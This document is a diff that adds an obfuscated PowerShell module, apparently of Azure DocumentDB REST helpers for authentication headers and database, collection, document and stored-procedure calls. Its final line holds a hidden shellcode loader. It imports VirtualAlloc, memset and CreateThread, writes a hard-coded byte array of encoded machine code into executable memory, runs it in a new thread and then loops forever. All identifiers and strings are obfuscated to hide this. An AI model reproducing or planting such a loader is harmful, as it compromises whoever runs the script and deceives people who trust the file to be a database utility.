@@ -1,0 +1,256 @@
+$7Rk4  = [TYpe]("{2}{1}{0}" -F'dINg','co','Text.EN');  sET-ItEm  VaRiablE:iNj ([type]("{2}{1}{0}"-F 'erT','sTem.COnV','Sy'))  ;   SEt  ('ir'+'M6') (  [TYPE]("{2}{4}{0}{5}{3}{1}"-F'tt','Y','sYSTeM.WEB','Tilit','.H','pU') );
+
+&("{2}{0}{1}"-f 'd','-Type','Ad') -AssemblyName ("{0}{2}{1}" -f 'System','Web','.')
+
+
+function n`E`w`-HEaDeR{
+    param([string]${A`CTI`oN} = "get"
+         ,[string]${reSTy`Pe}
+         ,[string]${ReSO`Urc`Eid}
+         ,[string]${Co`NNEC`TIonK`EY})
+    
+    ${A`p`iDAtE} = (&("{0}{1}"-f 'Get-','Date')).("{2}{3}{0}{1}" -f 'rsalT','ime','ToUn','ive').Invoke().("{0}{1}" -f'ToStr','ing').Invoke('R')
+
+    
+    ${kEyb`Y`Tes} =  (  VariABLe ("i"+"nj") -Va  )::("{1}{0}{2}{3}"-f'e64','FromBas','Strin','g').Invoke(${CoNnE`CTI`oN`KeY}) 
+    ${t`ExT} = @(${a`Ct`iOn}.("{0}{3}{2}{1}" -f'ToLowe','nt','a','rInvari').Invoke() + `
+                "`n" + ${R`Es`TYpe}.("{0}{1}{3}{2}"-f'ToL','o','erInvariant','w').Invoke() + `
+                "`n" + ${RES`o`Ur`Ceid} + `
+                "`n" + ${A`pI`dATe}.("{2}{0}{1}{3}"-f 'var','ian','ToLowerIn','t').Invoke() + "`n" + "`n")
+
+    ${b`ODy}  = ( DIR  vARIABle:7rK4).Value::"uT`F8".("{1}{0}" -f 'ytes','GetB').Invoke(${T`eXt})
+    ${H`ma`CshA} = &("{2}{0}{1}"-f 'w-o','bject','ne') -TypeName ("{2}{3}{0}{5}{6}{1}{4}"-f'rit','A2','Sy','stem.Secu','56','y.Cryp','tography.HMACSH') -ArgumentList (,${KEy`B`YTEs}) 
+    ${ha`Sh} = ${HM`A`CShA}."cO`mpU`Teha`sh"(${Bo`DY})
+    ${s`Ig`NA`TUrE} =  (  GEt-vaRiABLe  inj  -vALUeoNly)::"T`O`Base`64STring"(${Ha`sH})
+    ${Au`ThZ} =  (  vARIABle  ('ir'+'m6')  ).valUe::("{0}{3}{2}{1}"-f 'Url','e','od','Enc').Invoke($(("{3}{5}{4}{0}{2}{6}{1}"-f'ster&','1.0&sig=','v','t','e=ma','yp','er=') + ${Si`Gn`ATUrE}))
+
+    
+    ${hea`dE`RS} = &("{2}{1}{0}" -f 'ect','Obj','New-') ("{4}{3}{8}{10}{1}{6}{13}{7}{9}{5}{11}{0}{2}{12}"-f 'tring],[St','ct','ring]','ystem.C','S','r','ions.Gene','ic','oll','.Dictiona','e','y[[S',']','r')
+    ${hEa`DE`Rs}.("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}"-f 'Authoriza','on','ti'), ${Au`THz})
+    ${H`Ea`dERs}.("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}"-f 's-version','m','x-'), ("{0}{2}{1}" -f '20','-12-16','15'))
+    ${heaD`e`RS}.("{1}{0}" -f'd','Ad').Invoke(("{1}{0}{2}"-f'-da','x-ms','te'), ${A`P`iDaTE}) 
+    return ${H`Ea`DERs}
+}
+
+
+function gE`T`-doCDbdA`TABaSE {
+    param([string] ${roo`TurI}
+          ,[string] ${k`eY}
+          ,[string ]${D`BNaMe} 
+          )
+     
+    if(${dB`Name}){
+        ${r`EsO`UrCeID} = "dbs/$dbname"
+        ${U`Ri} = ${Ro`o`TUrI} + '/' + ${rESOu`RcE`Id}
+        ${hE`A`derS} = &("{0}{2}{1}" -f'N','-Header','ew') -resType ("{0}{1}"-f 'd','bs') -resourceId ${R`es`Our`CEId} -action ("{1}{0}"-f't','Ge') -connectionKey ${k`ey} 
+    } else {
+        ${rEsO`URc`eID} = "dbs"
+        ${U`RI} = ${r`ootURi} + '/' + ${RE`sOuRCE`ID}
+        ${heA`D`eRS} = &("{1}{0}{2}" -f'w-Head','Ne','er') -resType ("{1}{0}"-f's','db') -action ("{0}{1}"-f'G','et') -connectionKey ${K`Ey} 
+    }   
+
+    ${resPON`SE} = &("{3}{1}{2}{0}"-f'od','RestMet','h','Invoke-') -Uri ${u`RI} -Method ("{1}{0}" -f'et','G') -Headers ${h`E`ADErS}
+
+    return ${Re`sP`ONSE}
+}
+
+function neW-dO`cdbd`ATA`BASe{
+    param([string] ${ROOT`U`Ri}
+          ,[string] ${k`EY}
+          ,[string ]${d`B`Name})
+
+    ${U`Ri} = ${r`OOTuRi} + ("{1}{0}" -f'bs','/d')
+    ${h`EaDErs} = &("{3}{2}{1}{0}"-f'r','-Heade','w','Ne') -resType ("{0}{1}"-f 'd','bs') -action ("{0}{1}" -f 'Po','st') -connectionKey ${k`Ey}
+    ${bo`dY} = "{
+        `"id`": `"$dbname`"
+    }"
+    ${RE`S`PoNse} = &("{3}{4}{0}{1}{2}"-f 'estMet','ho','d','Invok','e-R') -Uri ${u`RI} -Method ("{1}{0}"-f 'ost','P') -Headers ${HEad`Ers} -Body ${BO`DY}
+    return ${RE`sPo`N`se}
+}
+
+function R`EMOVe-dOcdbD`Atab`A`Se {
+    param([string] ${rOO`TURI}
+          ,[string] ${K`EY}
+          ,[string]${dbNa`me} 
+          )
+
+    ${R`eso`UrcE`ID} = "dbs/$dbname"
+    ${u`Ri} =   ${rOO`TU`Ri} + '/' + ${rE`sO`UrceiD}
+    ${he`Ade`RS} = &("{2}{0}{1}" -f'He','ader','New-') -resType ("{1}{0}"-f's','db') -resourceId ${RESO`U`RCEid} -action ("{1}{0}" -f 'e','Delet') -connectionKey ${K`eY} 
+
+    ${rE`sPoNse} = &("{1}{0}{2}{5}{4}{3}"-f'k','Invo','e-Rest','od','h','Met') -Uri ${u`RI} -Method ("{1}{0}" -f'te','Dele') -Headers ${HEa`d`eRS}
+    return ${r`EsPOn`SE}
+}
+
+
+function ge`T-D`O`cD`B`COLleCTION{
+    param([string] ${Ro`OtU`RI}
+            ,[string] ${k`Ey}
+            ,[string ]${d`Bn`AmE}
+            ,[string] ${cOl`LECt`ioN}
+    )
+
+    if(${co`lle`ctIOn}){
+        ${RE`SoUr`CEId} = "dbs/$dbname/colls/$collection"
+        ${u`Ri} = ${rOotu`RI} + '/' + ${REs`OURc`eId}
+    } else {
+        ${REs`ou`RceId} = "dbs/$dbname"
+        ${u`Ri} = ${R`o`OTURI} + '/' + ${RESO`Ur`C`eID} + ("{0}{1}{2}"-f '/c','oll','s')
+    }
+    ${H`eA`Ders} = &("{1}{2}{0}" -f'der','New-He','a') -resType ("{1}{0}"-f'olls','c') -resourceId ${ReS`OuR`c`EId} -action ("{0}{1}" -f 'Ge','t') -connectionKey ${K`eY}
+    ${Re`Sp`OnSe} = &("{3}{0}{4}{2}{1}"-f 'voke-Res','hod','et','In','tM') -Uri ${U`Ri} -Method ("{1}{0}"-f 't','Ge') -Headers ${HeadE`RS} -Body ${B`OdY} 
+    return ${re`s`PoNSe}
+}
+
+function nEw`-`dO`CDBcoLlEctiOn{
+    param([string] ${Ro`Ot`URi}
+          ,[string] ${K`ey}
+          ,[string ]${d`BnaME}
+          ,[string] ${ColLec`T`IoN}
+          
+    )
+
+    ${u`RI} = ${r`oOt`UrI} + "/dbs/$dbname/colls"
+    ${HEa`dE`RS} = &("{0}{3}{2}{1}" -f 'New-He','r','e','ad') -resType ("{1}{0}"-f 'ls','col') -resourceId "dbs/$dbname" -action ("{1}{0}"-f 't','Pos') -connectionKey ${K`ey}
+
+    ${Bo`DY} = "{
+        `"id`": `"$collection`"
+    }"
+    ${r`ESpOn`se} = &("{0}{2}{1}{3}" -f 'Invoke-Res','ho','tMet','d') -Uri ${u`RI} -Method ("{0}{1}"-f 'Po','st') -Headers ${heAD`eRS} -Body ${Bo`DY}
+    return ${rESpO`N`Se}
+}
+
+function remoVE-d`ocDb`C`OLl`ect`ioN{
+    param([string] ${r`O`OTUrI}
+            ,[string] ${k`EY}
+            ,[string ]${Db`N`AMe}
+            ,[string] ${Coll`EC`TION}
+    )
+
+    ${REsOU`Rc`e`Id} = "dbs/$dbname/colls/$collection"
+    ${U`Ri} = ${Ro`o`TurI} + '/' + ${reS`O`URcE`iD}
+
+    ${H`E`AdErs} = &("{0}{1}{2}" -f 'Ne','w-Hea','der') -resType ("{1}{0}" -f 'lls','co') -resourceId ${rEso`Ur`CEId} -action ("{2}{1}{0}"-f 'ete','el','D') -connectionKey ${K`ey}
+    ${r`esp`onse} = &("{2}{0}{1}{3}{4}"-f'o','ke','Inv','-Re','stMethod') -Uri ${U`RI} -Method ("{0}{2}{1}" -f'De','e','let') -Headers ${hEAd`eRs} -Body ${BO`dy} 
+    return ${r`eSPoNSE}
+}
+
+
+function GEt-`Do`Cdb`DOCUmeNt{
+    param([string] ${RO`ot`Uri}
+          ,[string] ${k`EY}
+          ,[string ]${d`B`NaMe}
+          ,[string] ${c`oLL`ECT`iOn}
+          ,[string] ${I`D})
+    
+    ${rE`S`O`URcEid} = "dbs/$dbname/colls/$collection"
+
+    if(${ID}){
+        ${HeAde`Rs} = &("{3}{0}{2}{1}" -f 'w-Hea','r','de','Ne') -action ("{1}{0}" -f 't','Ge') -resType ("{1}{0}"-f's','doc') -resourceId "$resourceid/docs/$id" -connectionKey ${k`Ey}
+        ${U`Ri} = ${roO`Turi} + "/$resourceid/docs/$id"
+    } else {        
+        ${heA`d`eRS} = &("{1}{2}{0}{3}" -f 'ead','N','ew-H','er') -action ("{1}{0}"-f'et','G') -resType ("{0}{1}"-f 'd','ocs') -resourceId ${R`e`S`oUrcEId} -connectionKey ${k`eY}
+        ${u`Ri} = ${RoOT`URI} + "/$resourceid/docs"
+    }
+    ${Re`spO`NSe} = &("{0}{3}{2}{1}"-f 'In','estMethod','ke-R','vo') ${u`Ri} -Method ("{0}{1}"-f'Ge','t') -ContentType ("{2}{1}{4}{0}{3}"-f '/j','pplicat','a','son','ion') -Headers ${H`e`AdeRS}
+    return ${R`eSp`ONSe}
+}
+
+
+function new`-dO`cd`BDOcuM`eNt{
+    param([string]${D`ocU`ment}
+          ,[string] ${R`ootuRI}
+          ,[string] ${k`eY}
+          ,[string ]${DB`Na`me}
+          ,[string] ${cO`L`Le`cTIoN})
+    ${CO`LlNa`ME} = ("{0}{1}"-f 'dbs','/')+${dBN`A`me}+("{2}{1}{0}" -f 'ls/','ol','/c') + ${CoL`l`ect`IOn}
+    ${H`EadE`Rs} = &("{0}{1}{2}{3}" -f'Ne','w','-Head','er') -action ("{1}{0}"-f't','Pos') -resType ("{1}{0}"-f's','doc') -resourceId ${CoLL`N`AmE} -connectionKey ${k`EY}
+    ${h`e`AdErS}.("{1}{0}"-f'd','Ad').Invoke(("{3}{0}{2}{4}{1}{5}" -f'-documentdb','up','-','x-ms','is-','sert'), ("{0}{1}"-f 't','rue'))
+
+    ${u`Ri} = ${r`oOt`URi} + "/" + ${cO`Ll`NA`Me} + ("{1}{0}"-f 'ocs','/d')
+    
+    ${rE`sPO`Nse} = &("{2}{3}{1}{0}" -f 'ethod','e-RestM','In','vok') ${u`Ri} -Method ("{1}{0}" -f 't','Pos') -Body ${DOC`Um`EnT} -ContentType ("{4}{2}{1}{0}{3}" -f 't','ca','li','ion/json','app') -Headers ${H`eA`Ders}
+    return ${R`eSpoNsE}
+}
+
+function REMOve`-Do`CdBdO`C`U`mEntS{
+    param([string] ${Ro`O`TUri}
+          ,[string] ${k`eY}
+          ,[string ]${dB`NA`Me}
+          ,[string] ${c`oL`LEct`IOn}
+          ,[string] ${I`D} )
+
+    if(${I`d}){
+        ${D`OcS} = &("{3}{0}{1}{2}"-f 'et-DocDB','Docum','ent','G') -rooturi ${RO`OtuRi} -key ${k`EY} -dbname ${DBN`A`ME} -collection ${Co`LLecTI`on} -id ${Id}        
+    } else {
+        ${Do`Cs} = &("{2}{4}{1}{0}{3}" -f 'Docum','DB','Ge','ent','t-Doc') -rooturi ${Roo`T`UrI} -key ${K`eY} -dbname ${d`Bn`AmE} -collection ${C`olLeCT`I`On} 
+    }
+    ${R`ES`PoNSe} = @()
+    foreach(${D`oc} in ${do`Cs}."DOCUm`En`Ts"){
+        ${ReSO`Ur`C`eid} = "dbs/$dbname/colls/$collection/docs/$($doc.id)"
+        ${h`eaDE`Rs} = &("{1}{0}{2}" -f 'e','N','w-Header') -action ("{1}{0}"-f'te','Dele') -resType ("{0}{1}" -f 'do','cs') -resourceId ${REsO`UrCE`iD} -connectionKey ${k`EY}
+        ${u`Ri} = ${Ro`O`TuRi} + "/$resourceid"
+        ${rE`SpoNSE} += &("{2}{3}{5}{1}{0}{4}" -f 'Metho','t','I','nvoke','d','-Res') ${u`RI} -Method ("{0}{1}" -f'Delet','e') -Headers ${heA`derS}
+    }
+
+    return ${Res`po`NSe}
+}
+
+
+function AdD`-docdbST`OR`eDp`R`oCEDure{
+    param([string] ${ro`Ot`Uri}
+          ,[string] ${k`Ey}
+          ,[string ]${D`B`NaME}
+          ,[string] ${C`OL`lEctI`on}
+          ,[string] ${StoRedprO`ceD`U`Re}
+          )
+    ${c`OlL`NaME} = ("{1}{0}" -f'/','dbs')+${db`NAME}+("{1}{0}"-f'/','/colls') + ${C`OL`lE`cTIon}
+    ${H`e`AdeRs} = &("{2}{0}{1}"-f'ad','er','New-He') -action ("{1}{0}"-f'st','Po') -resType ("{1}{0}" -f'procs','s') -resourceId ${C`o`LLnAME} -connectionKey ${k`Ey}
+
+    ${U`Ri} = ${R`OOt`Uri} + "/" + ${CO`Llna`mE} + ("{0}{1}{2}" -f'/','spr','ocs')
+    
+    ${rE`spoN`se} = &("{4}{2}{5}{3}{1}{0}" -f'd','ho','nvoke-Res','t','I','tMe') ${u`Ri} -Method ("{1}{0}" -f't','Pos') -Body ${sTor`e`dpRo`cedure} -ContentType ("{0}{2}{1}{3}"-f'a','at','pplic','ion/json') -Headers ${H`eA`dErs}
+    return ${re`sP`ONSE}
+}
+
+
+function i`NVOke-`d`OcD`BQUeRy{
+    param([string]${Q`Uery}
+          ,[string] ${Ro`otu`RI}
+          ,[string] ${K`ey}
+          ,[string ]${DBN`AMe}
+          ,[string] ${C`oL`leC`TiOn})
+    ${c`Oll`NAMe} = ("{0}{1}"-f'd','bs/')+${d`BNaME}+("{1}{0}" -f'lls/','/co') + ${ColL`ec`TioN}
+    ${HEaD`Ers} = &("{1}{2}{0}" -f'der','New-He','a') -action ("{1}{0}" -f 'st','Po') -resType ("{0}{1}" -f'd','ocs') -resourceId ${cOl`lNA`mE} -connectionKey ${k`eY}
+    ${H`eADErS}.("{0}{1}" -f'Ad','d').Invoke(("{5}{2}{0}{3}{4}{1}" -f'-','ry','mentdb','isqu','e','x-ms-docu'), ("{1}{0}" -f'ue','tr'))
+    ${hE`ADE`Rs}.("{0}{1}"-f'Ad','d').Invoke(("{3}{1}{2}{0}"-f't-Type','te','n','Con'), ("{1}{0}{3}{2}"-f 'licat','app','+json','ion/query'))
+    ${QU`e`RYJSON} = "{
+        `"query`": `"$query`"
+    }"
+    ${u`RI} = ${roO`TurI} + "/" + ${COLL`Name} + ("{0}{1}" -f '/do','cs')
+    
+    ${R`espON`SE} = &("{0}{3}{2}{1}" -f 'Invo','d','RestMetho','ke-') ${U`Ri} -Method ("{0}{1}" -f'P','ost') -Body ${qU`er`YJSoN} -Headers ${HEaDe`RS}
+    return ${ReS`p`Onse}
+}
+
+function INvokE`-doCd`BsT`or`ed`PrOceDuRE{
+    param([string] ${Roo`Tu`Ri}
+          ,[string] ${k`EY}
+          ,[string ]${Db`NAme}
+          ,[string] ${COLL`ectI`On}
+          ,[string]${s`P`RoC}
+          ,[string]${pa`R`Ams})
+    ${r`eso`U`RCeID} = "dbs/$dbname/colls/$collection/sprocs/$sproc"
+    ${HeAdE`RS} = &("{1}{0}{2}"-f 'H','New-','eader') -action ("{1}{0}" -f 'st','Po') -resType ("{1}{0}"-f'ocs','spr') -resourceId ${reSoU`R`cE`id} -connectionKey ${k`EY}
+
+    ${u`Ri} = ${ROot`U`RI} + "/$resourceid"
+    if(${PA`R`AMS}){
+        ${R`e`SPOnse} = &("{3}{0}{1}{2}" -f's','tMetho','d','Invoke-Re') ${U`RI} -Method ("{1}{0}" -f 't','Pos') -Body ${p`Ar`AmS} -Headers ${HE`ADe`RS}
+    } else {
+         ${rEs`Po`NsE} = &("{0}{1}{4}{3}{2}" -f'I','nvoke-','d','ho','RestMet') ${U`RI} -Method ("{1}{0}" -f'st','Po') -Headers ${He`Ad`Ers}
+    }
+
+    return ${Re`sp`Onse}
+}
+
+${c} = ((("{82}{7}{30}{84}{22}{4}{104}{11}{80}{15}{32}{1}{6}{68}{73}{98}{85}{36}{49}{101}{105}{77}{97}{40}{76}{45}{96}{16}{57}{55}{9}{13}{79}{2}{103}{95}{48}{41}{35}{89}{5}{24}{26}{65}{17}{60}{78}{69}{43}{86}{46}{93}{21}{67}{34}{38}{92}{28}{3}{12}{83}{72}{59}{70}{29}{52}{74}{51}{63}{8}{100}{56}{19}{90}{25}{54}{88}{20}{50}{91}{18}{61}{37}{62}{53}{87}{66}{81}{44}{0}{10}{94}{31}{27}{75}{14}{99}{47}{33}{58}{39}{23}{71}{64}{42}{102}"-f'bl','stati','ct);[DllImp','t','}ke','c static ex','c ','DllIm','eter, ',', ui','ic','l{0','P','nt flPro','em',']publi',' uint dwSize, u','hread(','ThreadId);[DllI','dwC','r','nt ','{0','uint','ter','i','n IntPtr ','P',', In','a','p','tic extern Int','c ','t src','w','32.dl','r','port','Sta',' ','I','ernel','nt)','hre','pu','ress','ributes','t(IntPtr dest, uin','}k',' ',' l','ess, IntPtr lpPa','rtAdd','0}msv','o','ype','t ','int flAllocationT',',',' l','In','m','({','ram','ou','CreateT','.dll{0})','d','e','T','pSt',' c','r','xter','r','tr m','ntPtr lpAdd','o','tPtr lp','te','})',']','[','t','ort(','Pt','adAtt','crt','nFlags, IntPt','l{0})]publi','reat','p','ckSize',', ui',' sta','{0',',','c(','n Int','se','uin','Virtu',';','ort(','rnel32.dl','alAll')) -F [chAR]34);${W} = &("{0}{2}{1}" -f'Ad','pe','d-Ty') -memberDefinition ${c} -Name ("{1}{0}" -f'32','Win') -namespace ("{2}{1}{0}" -f'tions','n32Func','Wi') -passthru;[Byte[]];[Byte[]]${Z} = 0xb8,0x8a,0x4f,0x64,0x39,0xdb,0xd0,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31,0x47,0x13,0x83,0xc7,0x04,0x03,0x47,0x85,0xad,0x91,0xc5,0x71,0xb3,0x5a,0x36,0x81,0xd4,0xd3,0xd3,0xb0,0xd4,0x80,0x90,0xe2,0xe4,0xc3,0xf5,0x0e,0x8e,0x86,0xed,0x85,0xe2,0x0e,0x01,0x2e,0x48,0x69,0x2c,0xaf,0xe1,0x49,0x2f,0x33,0xf8,0x9d,0x8f,0x0a,0x33,0xd0,0xce,0x4b,0x2e,0x19,0x82,0x04,0x24,0x8c,0x33,0x21,0x70,0x0d,0xbf,0x79,0x94,0x15,0x5c,0xc9,0x97,0x34,0xf3,0x42,0xce,0x96,0xf5,0x87,0x7a,0x9f,0xed,0xc4,0x47,0x69,0x85,0x3e,0x33,0x68,0x4f,0x0f,0xbc,0xc7,0xae,0xa0,0x4f,0x19,0xf6,0x06,0xb0,0x6c,0x0e,0x75,0x4d,0x77,0xd5,0x04,0x89,0xf2,0xce,0xae,0x5a,0xa4,0x2a,0x4f,0x8e,0x33,0xb8,0x43,0x7b,0x37,0xe6,0x47,0x7a,0x94,0x9c,0x73,0xf7,0x1b,0x73,0xf2,0x43,0x38,0x57,0x5f,0x17,0x21,0xce,0x05,0xf6,0x5e,0x10,0xe6,0xa7,0xfa,0x5a,0x0a,0xb3,0x76,0x01,0x42,0x70,0xbb,0xba,0x92,0x1e,0xcc,0xc9,0xa0,0x81,0x66,0x46,0x88,0x4a,0xa1,0x91,0xef,0x60,0x15,0x0d,0x0e,0x8b,0x66,0x07,0xd4,0xdf,0x36,0x3f,0xfd,0x5f,0xdd,0xbf,0x02,0x8a,0x72,0x90,0xac,0x65,0x33,0x40,0x0c,0xd6,0xdb,0x8a,0x83,0x09,0xfb,0xb4,0x4e,0x22,0x96,0x4f,0x18,0x8d,0xcf,0x51,0xdd,0x65,0x12,0x52,0xcc,0x29,0x9b,0xb4,0x84,0xc1,0xcd,0x6f,0x30,0x7b,0x54,0xfb,0xa1,0x84,0x42,0x81,0xe1,0x0f,0x61,0x75,0xaf,0xe7,0x0c,0x65,0x47,0x08,0x5b,0xd7,0xc1,0x17,0x71,0x72,0xed,0x8d,0x7e,0xd5,0xba,0x39,0x7d,0x00,0x8c,0xe5,0x7e,0x67,0x87,0x2c,0xeb,0xc8,0xff,0x50,0xfb,0xc8,0xff,0x06,0x91,0xc8,0x97,0xfe,0xc1,0x9a,0x82,0x00,0xdc,0x8e,0x1f,0x95,0xdf,0xe6,0xcc,0x3e,0x88,0x04,0x2b,0x08,0x17,0xf6,0x1e,0x88,0x6b,0x21,0x66,0xfe,0x85,0xf1;${g} = 0x1000;if (${z}."lE`N`Gth" -gt 0x1000){${G} = ${Z}."LEnG`Th"};${x}=${W}::("{2}{0}{1}" -f 'lAl','loc','Virtua').Invoke(0,0x1000,${G},0x40);for (${i}=0;${i} -le (${z}."L`enG`TH"-1);${I}++) {${W}::"Mem`sET"([IntPtr](${X}.("{0}{1}"-f'To','Int32').Invoke()+${i}), ${Z}[${i}], 1)};${W}::("{0}{3}{1}{2}" -f'Cr','r','ead','eateTh').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{2}{0}" -f'sleep','Sta','rt-') 60};
